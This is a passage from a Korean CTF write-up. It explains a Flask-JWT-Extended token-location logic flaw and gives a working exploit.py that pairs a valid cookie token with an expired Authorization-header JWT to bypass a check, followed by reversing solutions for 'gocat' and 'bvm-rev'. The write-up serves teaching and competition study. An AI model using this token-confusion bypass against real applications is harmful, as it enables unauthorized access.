            <span class="p">)</span>
            <span class="k">raise</span> <span class="n">NoAuthorizationError</span><span class="p">(</span><span class="n">err_msg</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="k">raise</span> <span class="n">NoAuthorizationError</span><span class="p">(</span><span class="n">errors</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>

    <span class="n">verify_token_type</span><span class="p">(</span><span class="n">decoded_token</span><span class="p">,</span> <span class="n">expected_type</span><span class="o">=</span><span class="n">request_type</span><span class="p">)</span>
    <span class="n">verify_token_not_blacklisted</span><span class="p">(</span><span class="n">decoded_token</span><span class="p">,</span> <span class="n">request_type</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">decoded_token</span><span class="p">,</span> <span class="n">jwt_header</span>
</code></pre></div></div>

<ul>
  <li>위와 같이 for 반복문을 이용하여 <strong><code class="highlighter-rouge">location</code></strong> 토큰이 있을 것이라 미리 선언되어 있던 위치를 모두 확인하여 <strong><code class="highlighter-rouge">get_encoded_token_functions</code></strong>에 append 한다. 이때 location은 config.py에 <strong>JWT_TOKEN_LOCATION</strong>으로 선언하거나 <strong>app.config[‘JWT_TOKEN_LOCATION’]</strong>에 선언할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">for</span> <span class="n">get_encoded_token_function</span> <span class="ow">in</span> <span class="n">get_encoded_token_functions</span><span class="p">:</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">encoded_token</span><span class="p">,</span> <span class="n">csrf_token</span> <span class="o">=</span> <span class="n">get_encoded_token_function</span><span class="p">()</span>
            <span class="n">decoded_token</span> <span class="o">=</span> <span class="n">decode_token</span><span class="p">(</span><span class="n">encoded_token</span><span class="p">,</span> <span class="n">csrf_token</span><span class="p">)</span>
            <span class="n">jwt_header</span> <span class="o">=</span> <span class="n">get_unverified_jwt_headers</span><span class="p">(</span><span class="n">encoded_token</span><span class="p">)</span>
            <span class="k">break</span>
        <span class="k">except</span> <span class="n">NoAuthorizationError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">errors</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
</code></pre></div></div>

<ul>
  <li>이때 위와 같이 get_encoded_token_functions에 append된 모든 위치에서 토큰을 파싱하는 것이 아니라 append된 순서대로 token을 검사하되, <strong>하나가 정상적으로 파싱되었을 경우, 뒤의 토큰은 무시하도록 코드가 작성</strong>되어 있다.  따라서 토큰의 위치가 여러 곳으로 지정할 경우 로지컬한 취약점이 발생할 수 있고, 이번 문제의 컨셉 또한 이와 동일하다.</li>
  <li>다시 문제로 돌아와 눈여겨봐야 할 것은 <strong>app.config[‘JWT_TOKEN_LOCATION’]</strong>이다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">with</span> <span class="n">app</span><span class="p">.</span><span class="n">app_context</span><span class="p">():</span>
        <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'JWT_SECRET_KEY'</span><span class="p">]</span>     <span class="o">=</span> <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'SECRET'</span><span class="p">]</span>
        <span class="n">app</span><span class="p">.</span><span class="n">config</span><span class="p">[</span><span class="s">'JWT_TOKEN_LOCATION'</span><span class="p">]</span> <span class="o">=</span> <span class="p">[</span><span class="s">'cookies'</span><span class="p">,</span> <span class="s">'headers'</span><span class="p">]</span>
        <span class="n">jwtmanager</span>                       <span class="o">=</span> <span class="n">JWTManager</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">app</span>
</code></pre></div></div>

<ul>
  <li>JWT 토큰의 위치가 cookies, 그리고 headers로 되어 있다. <strong><code class="highlighter-rouge">jwt_required</code></strong>와 <code class="highlighter-rouge">**get_jwt_identity()**</code>에서는 cookies에 선언된 JWT Token을 통해 검증하게 된다. 그러나 인위적으로 Authorization 헤더를 통해 검증하는 곳에서는 <strong><code class="highlighter-rouge">_decode_jwt_from_request</code></strong>에서 return하는 토큰과는 다르다.</li>
  <li>이와 같은 검사 루틴을 통해 검증할 경우 로지컬한 취약점이 발생할 수 있기 때문에 Flask-JWT-Extended의 경우 해당 모듈에서 제공하는 함수로 토큰 검사 및 검증 값을 반환할 수 있도록 하는 것이 권장된다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># exploit.py
</span><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">import</span> <span class="nn">jwt</span>

<span class="n">requests</span><span class="p">.</span><span class="n">packages</span><span class="p">.</span><span class="n">urllib3</span><span class="p">.</span><span class="n">disable_warnings</span><span class="p">()</span>

<span class="c1"># Get Token
</span><span class="n">url</span>     <span class="o">=</span> <span class="s">"http://ctf.kkamikoon.com/"</span>
<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">"Content-Type"</span>  <span class="p">:</span> <span class="s">"application/json; charset=utf-8"</span> <span class="p">}</span>
<span class="n">data</span>    <span class="o">=</span> <span class="p">{</span> <span class="s">"username"</span>      <span class="p">:</span> <span class="s">"admin"</span><span class="p">,</span>
            <span class="s">"password"</span>      <span class="p">:</span> <span class="s">"admin"</span> <span class="p">}</span>

<span class="n">res</span>     <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s">"login"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
<span class="n">new</span>     <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)[</span><span class="s">'access_token'</span><span class="p">]</span>

<span class="c1"># Expired JWT == Exploit JWT
</span><span class="n">exploit_jwt</span>     <span class="o">=</span> <span class="s">"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE1OTc4NTc4MzcsIm5iZiI6MTU5Nzg1NzgzNywianRpIjoiMzQyYjNlZTItMzQ1My00Y2IzLWFjYzgtZjMxMzcyYjU3NGEwIiwiZXhwIjoxNTk3ODU3ODAwLCJpZGVudGl0eSI6Imd1ZXN0IiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIiwiY3NyZiI6IjRmNGE4YTk3LTdiNDEtNGZiMy1iYzcxLTE0YjBiODM3ZmQyNSJ9.pJYyoZjq-6l06TQ6ugfQZjoHtSClEhW_6AvXzYjAQM8"</span> <span class="c1"># expired
</span><span class="n">exploit_headers</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">"Authorization"</span> <span class="p">:</span> <span class="s">f"Bearer </span><span class="si">{</span><span class="n">exploit_jwt</span><span class="si">}</span><span class="s">"</span><span class="p">,</span>
    <span class="s">"Cookie"</span>        <span class="p">:</span> <span class="s">f"access_token_cookie=</span><span class="si">{</span><span class="n">new</span><span class="si">}</span><span class="s">"</span>
<span class="p">}</span>

<span class="n">res</span>     <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span> <span class="o">+</span> <span class="s">"flag"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">exploit_headers</span><span class="p">,</span> <span class="n">verify</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="n">res</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</code></pre></div></div>

<p><br></p>

<p><br></p>

<h1 id="️-reversing">
<a class="anchor" href="#%EF%B8%8F-reversing" aria-hidden="true"><span class="octicon octicon-link"></span></a>🖥️ REVERSING</h1>

<h2 id="gocat">
<a class="anchor" href="#gocat" aria-hidden="true"><span class="octicon octicon-link"></span></a>gocat</h2>

<hr>

<p><img src="/assets/bob/bob945.png" alt="/assets/bob/bob945.png"></p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>golang 리버싱 &amp; 간단한 역연산 / 0 solver
</code></pre></div></div>
<ul>
  <li>주어진 문제 파일을 다운로드받고 바이너리를 ida로 열게되면 아래와 같이 심볼이 살아있지 않은 것처럼 보인다.</li>
</ul>

<p><img src="/assets/bob/bob946.png" alt="/assets/bob/bob946.png"></p>

<ul>
  <li>하지만 golang은 코드 작성시 사용한 패키지와 여러 함수에 대한 정보들을 <code class="highlighter-rouge">gopclntab</code> 섹션에 저장한다. 해당 섹션에 저장 시, 아래와 같은 구조체를 가진다.</li>
</ul>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">_FUNCTIONINFO</span> <span class="p">{</span>
	<span class="n">QDWORD</span> <span class="n">lpFunctionAddr</span><span class="p">,</span>
	<span class="n">QDWORD</span> <span class="n">qdNameOffset</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>따라서, 해당 섹션의 구조체를 파싱해서 오디팅을 진행하면 된다. 하지만 이 작업들은 너무 많은 노동이 필요하므로 누군가 만들어놓은 <a href="https://github.com/strazzere/golang_loader_assist">ida golang assist</a>를 사용하면 아래의 그림과 같이 비교적 깔끔한 함수명을 확인 할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob947.png" alt="/assets/bob/bob947.png"></p>

<ul>
  <li>위와 같이 assist를 사용해 함수명을 바꿔준 이후, main_main함수를 찾아서 디컴파일한다.</li>
</ul>

<p><img src="/assets/bob/bob948.png" alt="/assets/bob/bob948.png"></p>

<ul>
  <li>main_main함수를 대략적으로 살펴보면 어느정도 구조가 눈에 들어오게 되는데 다음과 같은 pseudo code로 되어있음을 알 수 있고, 역연산이 충분히 가능한 구조인 것 또한 알 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># pseudo code
</span><span class="n">seed</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="n">unixtime</span><span class="p">()</span>
<span class="n">srand</span><span class="p">(</span><span class="n">seed</span><span class="p">);</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">256</span><span class="p">):</span>
	<span class="n">table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">rand</span><span class="p">()</span>

<span class="n">flag</span> <span class="o">=</span> <span class="nb">input</span><span class="p">()</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">44</span><span class="p">:</span>
	<span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="n">result</span> <span class="o">=</span> <span class="p">[]</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">44</span><span class="p">):</span>
	<span class="n">result</span> <span class="o">+=</span> <span class="p">[</span> <span class="n">getRandom</span><span class="p">()</span> <span class="o">*</span> <span class="n">table</span><span class="p">[</span><span class="n">getIndex</span><span class="p">((</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">i</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)]</span> <span class="o">+</span> <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">44</span><span class="p">):</span>
	<span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">result</span><span class="p">[</span><span class="n">i</span><span class="p">])</span>
</code></pre></div></div>

<ul>
  <li>여기서 추가적으로 분석해야할 것은 getIndex함수인데, 해당 함수를 살펴보면 다음과 같다.</li>
</ul>

<p><img src="/assets/bob/bob949.png" alt="/assets/bob/bob949.png"></p>

<ul>
  <li>재귀적으로 호출하는 것을 볼 수 있는데, 정상적으로 디컴파일이 되지 않는다. 이러한 이유 때문에 어셈 코드를 보아야한다.</li>
</ul>

<p><img src="/assets/bob/bob950.png" alt="/assets/bob/bob950.png"></p>

<p><img src="/assets/bob/bob951.png" alt="/assets/bob/bob951.png"></p>

<ul>
  <li>위의 두 그림에서 볼 수 있듯, eax가 getIndex함수에서 스택으로 들어가는 것을 확인할 수 있고 대략적으로 아래와 같이 동작하는 것을 확인할 수 있다.</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">getIndex</span><span class="p">(</span><span class="n">depth</span><span class="p">):</span>
	<span class="k">if</span> <span class="n">depth</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
		<span class="k">return</span> <span class="mi">1</span>
	<span class="k">return</span> <span class="p">(</span><span class="n">getIndex</span><span class="p">(</span><span class="n">depth</span> <span class="o">-</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">depth</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">%</span> <span class="mi">256</span>
</code></pre></div></div>

<ul>
  <li>위의 식대로 계산을 하면 피보나치 수열임을 알 수 있는데, 이를 재귀적으로 구현했기 때문에 40번째 수열 값을 계산하기 위해서 적지않은 계산이 필요하게 된다. 그러므로 memorization 이나 간단하게 미리 배열로 계산을 해주면 된다.</li>
  <li>위의 작업들을 모두 합쳐서, 역연산을 하기 위한 poc를 작성하면 다음과 같다.</li>
</ul>

<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>

<span class="k">import</span> <span class="p">(</span>
   <span class="s">"fmt"</span>
   <span class="s">"math/rand"</span>
   <span class="s">"time"</span>
<span class="p">)</span>
<span class="k">var</span> <span class="n">memory</span> <span class="p">[]</span><span class="kt">int</span>

<span class="k">func</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">idx</span> <span class="kt">int</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
   <span class="k">if</span> <span class="n">memory</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">!=</span> <span class="m">0</span> <span class="p">{</span>
      <span class="k">return</span> <span class="n">memory</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span>
   <span class="p">}</span>
   <span class="k">if</span> <span class="n">idx</span> <span class="o">&lt;</span> <span class="m">2</span> <span class="p">{</span>
      <span class="n">memory</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="m">1</span>
      <span class="k">return</span> <span class="m">1</span>
   <span class="p">}</span>
   <span class="n">result</span> <span class="o">:=</span> <span class="p">(</span><span class="n">getIndex</span><span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="m">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">getIndex</span><span class="p">(</span><span class="n">idx</span> <span class="o">-</span> <span class="m">1</span><span class="p">))</span> <span class="o">&amp;</span> <span class="m">0xFF</span>
   <span class="n">memory</span><span class="p">[</span><span class="n">idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">result</span>
   <span class="k">return</span> <span class="n">result</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">getRandom</span><span class="p">(</span><span class="n">r</span> <span class="o">*</span><span class="n">rand</span><span class="o">.</span><span class="n">Rand</span><span class="p">)</span> <span class="kt">int</span> <span class="p">{</span>
   <span class="k">return</span> <span class="n">r</span><span class="o">.</span><span class="n">Int</span><span class="p">()</span>
<span class="p">}</span>

<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
   <span class="n">memory</span> <span class="o">=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">int</span><span class="p">,</span> <span class="m">0x100</span><span class="p">)</span>
   <span class="n">flag_enc</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">uint32</span><span class="p">{</span>
<span class="m">2069409670</span><span class="p">,</span> <span class="m">2964128287</span><span class="p">,</span> <span class="m">2354096995</span><span class="p">,</span> <span class="m">3032984546</span><span class="p">,</span> <span class="m">10510900</span><span class="p">,</span> <span class="m">2544990927</span><span class="p">,</span> <span class="m">2926778951</span><span class="p">,</span> <span class="m">552570446</span><span class="p">,</span> <span class="m">1853857527</span><span class="p">,</span> <span class="m">3973419442</span><span class="p">,</span> <span class="m">3048538325</span><span class="p">,</span> <span class="m">1902664467</span><span class="p">,</span> <span class="m">420185447</span><span class="p">,</span> <span class="m">2658384181</span><span class="p">,</span> <span class="m">2929871612</span><span class="p">,</span> <span class="m">4151170943</span><span class="p">,</span> <span class="m">7446955</span><span class="p">,</span> <span class="m">2503536331</span><span class="p">,</span> <span class="m">1899187641</span><span class="p">,</span> <span class="m">3227466824</span><span class="p">,</span> <span class="m">3596188763</span><span class="p">,</span> <span class="m">2770886128</span><span class="p">,</span> <span class="m">3598361089</span><span class="p">,</span> <span class="m">3417226313</span><span class="p">,</span> <span class="m">2440643422</span><span class="p">,</span> <span class="m">157914802</span><span class="p">,</span> <span class="m">380458138</span><span class="p">,</span> <span class="m">2585576567</span><span class="p">,</span> <span class="m">3413857472</span><span class="p">,</span> <span class="m">2292452225</span><span class="p">,</span> <span class="m">2949469921</span><span class="p">,</span> <span class="m">3191119812</span><span class="p">,</span> <span class="m">3830151779</span><span class="p">,</span> <span class="m">783135889</span><span class="p">,</span> <span class="m">801108861</span><span class="p">,</span> <span class="m">50993623</span><span class="p">,</span> <span class="m">2780019976</span><span class="p">,</span> <span class="m">283706417</span><span class="p">,</span> <span class="m">64541485</span><span class="p">,</span> <span class="m">3786109553</span><span class="p">,</span> <span class="m">4159600537</span><span class="p">,</span> <span class="m">2979925216</span><span class="p">,</span> <span class="m">3157377353</span><span class="p">,</span> <span class="m">420734285</span><span class="p">,</span>
   <span class="p">}</span>
   <span class="k">for</span> <span class="n">unix</span> <span class="o">:=</span> <span class="n">time</span><span class="o">.</span><span class="n">Now</span><span class="p">()</span><span class="o">.</span><span class="n">Unix</span><span class="p">();</span> <span class="n">unix</span> <span class="o">&gt;</span> <span class="m">0</span><span class="p">;</span> <span class="n">unix</span><span class="o">--</span> <span class="p">{</span>
      <span class="n">r</span> <span class="o">:=</span> <span class="n">rand</span><span class="o">.</span><span class="n">New</span><span class="p">(</span><span class="n">rand</span><span class="o">.</span><span class="n">NewSource</span><span class="p">(</span><span class="n">unix</span><span class="p">))</span>
      <span class="n">table</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">uint8</span><span class="p">,</span> <span class="m">0x100</span><span class="p">)</span>

      <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="m">0x100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
         <span class="n">table</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="kt">uint8</span><span class="p">(</span><span class="n">getRandom</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
      <span class="p">}</span>
      <span class="n">prefix</span> <span class="o">:=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="s">"bob"</span><span class="p">)</span>
      <span class="n">found</span> <span class="o">:=</span> <span class="no">true</span>

      <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="m">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
         <span class="n">calc</span> <span class="o">:=</span> <span class="kt">int</span><span class="p">(</span><span class="n">prefix</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="kt">int</span><span class="p">(</span><span class="n">table</span><span class="p">[</span><span class="n">getIndex</span><span class="p">(((</span><span class="m">1</span> <span class="o">&lt;&lt;</span> <span class="kt">uint32</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="o">%</span> <span class="m">256</span><span class="p">))])</span> <span class="o">*</span> <span class="n">getRandom</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
         <span class="k">if</span> <span class="kt">uint32</span><span class="p">(</span><span class="n">calc</span><span class="p">)</span> <span class="o">!=</span> <span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">{</span>
            <span class="n">found</span> <span class="o">=</span> <span class="no">false</span>
            <span class="k">break</span>
         <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="n">found</span> <span class="o">==</span> <span class="no">true</span> <span class="p">{</span>
         <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"[+] Found flag"</span><span class="p">)</span>
         <span class="n">flag</span> <span class="o">:=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">))</span>
         <span class="k">for</span> <span class="n">i</span> <span class="o">:=</span> <span class="nb">len</span><span class="p">(</span><span class="n">prefix</span><span class="p">);</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span> <span class="p">{</span>
            <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="kt">byte</span><span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="kt">uint32</span><span class="p">(</span><span class="n">flag_enc</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">-</span> <span class="kt">int</span><span class="p">(</span><span class="n">table</span><span class="p">[(</span><span class="n">getIndex</span><span class="p">((</span><span class="m">1</span> <span class="o">&lt;&lt;</span> <span class="kt">uint32</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">%</span> <span class="m">256</span><span class="p">)))])</span> <span class="o">*</span> <span class="n">getRandom</span><span class="p">(</span><span class="n">r</span><span class="p">))</span>
         <span class="p">}</span>
         <span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"flag =&gt; "</span><span class="p">,</span> <span class="kt">string</span><span class="p">(</span><span class="n">prefix</span><span class="p">)</span> <span class="o">+</span> <span class="kt">string</span><span class="p">(</span><span class="n">flag</span><span class="p">))</span>
         <span class="k">return</span>
      <span class="p">}</span>
   <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>flag: bob{DO_NOT_USING_GOLANG_PLZ_JUST_KEEP_GOING}</p>

<p><br></p>

<p><br></p>

<h2 id="bvm-rev">
<a class="anchor" href="#bvm-rev" aria-hidden="true"><span class="octicon octicon-link"></span></a>bvm-rev</h2>

<hr>

<p><img src="/assets/bob/bob952.png" alt="/assets/bob/bob952.png"></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bvm 바이너리에서 로드하는 flag.bvm의 코드 흐름 분석
</code></pre></div></div>
<p><img src="/assets/bob/bob953.png" alt="/assets/bob/bob953.png"></p>

<p>bvm 파일은 위 그림과 같은 구조를 가지고, 각 섹션은 코드 영역, 데이터 영역, 변수 영역 등으로 사용된다.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">CALLSTACK</span> <span class="p">{</span>
    <span class="kt">uint16_t</span> <span class="n">reg</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
    <span class="kt">uint16_t</span> <span class="n">retaddr</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="n">BVM</span> <span class="p">{</span>
    <span class="kt">uint16_t</span> <span class="n">section</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="kt">uint8_t</span> <span class="mi">32</span><span class="p">;</span>
    <span class="kt">int8_t</span> <span class="n">zf</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">CALLSTACK</span> <span class="n">callstack</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
    <span class="kt">int8_t</span> <span class="n">cs_count</span><span class="p">;</span>
    <span class="kt">uint32_t</span> <span class="n">size</span><span class="p">;</span>
    <span class="kt">uint8_t</span> <span class="n">data</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
    <span class="kt">uint16_t</span> <span class="n">reg</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span> <span class="c1">//ax, bx, cx, dx</span>
    <span class="kt">uint16_t</span> <span class="n">pc</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<p>각 opcode가 어떤 동작을 하는지 파악하기 위해서는 구조체를 정의하고 분석하는 것이 편하다.</p>

<p>그리고 분석을 통해 아래의 몇가지 사실을 알 수 있다.</p>

<ol>
  <li>4개의 register(ax, bx, cx, dx)를 사용하고 각 레지스터와 모든 연산처리는 2bytes 크기를 가진다.</li>
  <li>CALL instruction을 호출할 때 register와 돌아올 주소를 백업하고, RETURN을 만나면 ax register를 제외한 register를 복원하고 돌아올 주소로 pc를 변경한다.</li>
  <li>경계(boundary)를 넘어서는 참조가 발견되면 프로그램이 종료된다. (일부 opcode에서는 경계 검사를 하지 않는다)</li>
</ol>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.KEY
db 170, 68, 138, 0, 142, 162, 151, 226, 51, 148, 151, 94, 14, 185, 161, 33

.ENC_FLAG
db 123, 120, 140, 153, 192, 37, 165, 150, 203, 23, 199, 222, 164, 129, 2, 229, 59, 56, 195, 97, 207, 108, 50, 51, 153, 248, 39, 72, 122, 0, 93, 44, 113

.GET_FLAG_LENGTH
MOVE ax, SECTION#INPUT_FLAG
MOVE cx, 0
:LABEL_1
MOVE bx, ax
ADD bx, cx
MOVE bx, [bx]
AND bx, 255
COMP bx, 0
JE LABEL_2
COMP bx, 10 // '\n'
JE LABEL_2
ADD cx, 1
JMP LABEL_1
:LABEL_2
MOVE ax, cx
RETURN

.ROL
MOVE cx, bx
MOD cx, 8
MOVE bx, 8
SUB bx, cx
RSHIFT cx, ax, bx

MOVE dx, 8
SUB dx, bx
MOVE bx, dx

LSHIFT dx, ax, bx
MOVE bx, 8
LSHIFT ax, cx, bx
SUB dx, ax
MOVE ax, dx
ADD ax, cx
RETURN

.FLAG_CHECK
MOVE cx, 0

:LABEL_3
MOVE ax, SECTION#INPUT_FLAG
ADD ax, cx
MOVE ax, [ax]
AND ax, 255
MOVE bx, cx
CALL ROL
MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE [bx], ax

MOVE ax, SECTION#KEY
MOVE bx, cx
MOD bx, 16
ADD ax, bx
MOVE dx, [ax]
AND dx, 255

MOVE ax, SECTION#INPUT_FLAG
MOVE bx, cx
ADD bx, 1
MOD bx, 33
ADD ax, bx
MOVE ax, [ax]
AND ax, 255

ADD dx, ax
MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE ax, [bx]
XOR ax, dx
AND ax, 255

MOVE bx, SECTION#RESULT_FLAG
ADD bx, cx
MOVE [bx], ax

ADD cx, 1
COMP cx, 33
JNE LABEL_3

MOVE cx, 0
MOVE dx, 1

:LABEL_4
MOVE ax, SECTION#RESULT_FLAG
ADD ax, cx
MOVE ax, [ax]
AND ax, 255
MOVE bx, SECTION#ENC_FLAG
ADD bx, cx
MOVE bx, [bx]
AND bx, 255
COMP ax, bx
JE LABEL_5
MOVE dx, 0
:LABEL_5

ADD cx, 1
COMP cx, 33
JNE LABEL_4
MOVE ax, dx
RETURN

.STRING_CHECK_YOUR_FLAG
string "Check your flag: "

.STRING_CORRECT
string "Correct !!\n"

.STRING_INCORRECT
string "Wrong ...\n"

.INPUT_FLAG
empty 50

.RESULT_FLAG
empty 34

.MAIN
MOVE cx, 17
MOVE bx, SECTION#STRING_CHECK_YOUR_FLAG
MOVE ax, 1
SYSCALL

MOVE cx, 48
MOVE bx, SECTION#INPUT_FLAG
MOVE ax, 0
SYSCALL

CALL GET_FLAG_LENGTH
COMP ax, 33
JNE LABEL_6

CALL FLAG_CHECK
COMP ax, 1

JNE LABEL_6
MOVE cx, 11
MOVE bx, SECTION#STRING_CORRECT
MOVE ax, 1
SYSCALL
RETURN

:LABEL_6
MOVE cx, 10
MOVE bx, SECTION#STRING_INCORRECT
MOVE ax, 1
SYSCALL
RETURN
</code></pre></div></div>

<p>bvm 바이너리 분석을 통해 각 bvm opcode를 해석하고 flag.bvm을 위와 같이 disassemble한다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">ROL</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">shift</span><span class="p">):</span>
    <span class="n">shift</span> <span class="o">%=</span> <span class="mi">8</span>
    <span class="n">remains</span> <span class="o">=</span> <span class="n">data</span> <span class="o">&gt;&gt;</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="n">shift</span><span class="p">)</span>
    <span class="n">body</span> <span class="o">=</span> <span class="p">(</span><span class="n">data</span> <span class="o">&lt;&lt;</span> <span class="n">shift</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">remains</span> <span class="o">&lt;&lt;</span> <span class="mi">8</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">body</span> <span class="o">+</span> <span class="n">remains</span><span class="p">)</span>

